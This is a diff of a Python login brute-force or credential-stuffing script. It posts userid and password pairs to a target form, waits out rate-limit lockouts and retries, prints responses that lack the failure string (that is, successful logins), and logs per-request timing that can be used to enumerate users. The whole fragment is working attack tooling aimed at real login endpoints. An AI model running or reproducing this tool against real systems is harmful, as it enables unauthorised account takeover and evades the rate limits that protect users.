@@ -36,9 +36,8 @@ POST request, change request fields as needed in the data variable
 def do_req(TARGET_URL, userid, passwd, HEADERS):
   data = {"userid": userid, "passwd": passwd, "submit": "submit"}
   res = requests.post(url=TARGET_URL, headers=HEADERS, data=data)
-  print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))
 
-  return res.text
+  return res
 
 def main():
   # check if this script has been runned with an argument, and the argument exists and is a file
@@ -63,17 +62,17 @@ def main():
       res = do_req(TARGET_URL, userid, passwd, HEADERS)
       
       # If the timeout string has been detected 
-      if res.find(TIMEOUT_STRING) != -1:
+      if res.text.find(TIMEOUT_STRING) != -1:
         print(f"[!] Hit maximum number of requests!")
         print(f"[-] Restarting in {REQUEST_PAUSE} seconds")
         time.sleep(REQUEST_PAUSE)
         res = do_req(TARGET_URL, userid, passwd, HEADERS)
       
       # Process the response
-      print("[-] Checking account {} {}".format(userid, passwd))
+      print("[+] Checking account {} | {} | req_time = {}".format(userid, passwd, res.elapsed.total_seconds()))
     
-      if res.find(FAILURE_STRING) == -1:
-        print(res)
+      if res.text.find(FAILURE_STRING) == -1:
+        print(res.text)
 
 
 if __name__ == "__main__":
